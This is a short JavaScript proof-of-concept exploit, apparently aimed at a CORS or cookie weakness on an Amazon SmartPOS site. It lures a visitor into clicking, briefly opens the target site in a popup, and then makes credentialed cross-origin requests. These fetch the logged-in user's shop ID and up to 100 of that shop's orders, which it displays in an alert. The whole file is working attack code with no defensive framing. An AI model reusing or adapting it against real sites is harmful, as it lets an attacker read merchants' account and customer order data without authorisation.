document.write('<h15>Click Anywhere To Start</h1>')
document.body.onclick = () => {
    let w = window.open('https://smartpos.amazon.in/', '_blank');
    setTimeout(() => {
        w.close();
        (function(){
            function f(){
                var x = new XMLHttpRequest();
                x.open('GET', 'https://smartpos.amazon.in/api-db/resources/v2/dashboard/user/getUser', true);
                x.withCredentials = true;
                x.onreadystatechange = function(){
                    if(x.readyState === 4){
                        if(x.status === 200){
                            try {
                                var r = JSON.parse(x.responseText);
                                var s = r.onlineShopId;
                                if(s){
                                    c(s);
                                } else {
                                    alert('Error: storeId not found in response.');
                                }
                            } catch(e){
                                alert('Failed to parse response or find storeId.');
                            }
                        } else {
                            alert('GET request failed with status: ' + x.status);
                        }
                    }
                };
                x.send();
            }

            function c(s){
                var x = new XMLHttpRequest();
                x.open('POST', `https://smartpos.amazon.in/api-orders/resources/v3/orders/${s}/?pageSize=100`, true);
                x.setRequestHeader('Content-Type', 'application/json');
                x.withCredentials = true;
                var b = JSON.stringify({});
                x.onreadystatechange = function(){
                    if(x.readyState === 4){
                        if(x.status === 200){
                            var r = JSON.stringify(JSON.parse(x.responseText), null, 2);
                            alert('Response:\n' + r);
                        } else {
                            alert('POST request failed with status: ' + x.status);
                        }
                    }
                };
                x.send(b);
            }

            setTimeout(f, 2000);
        })();
    }, 2000);
};
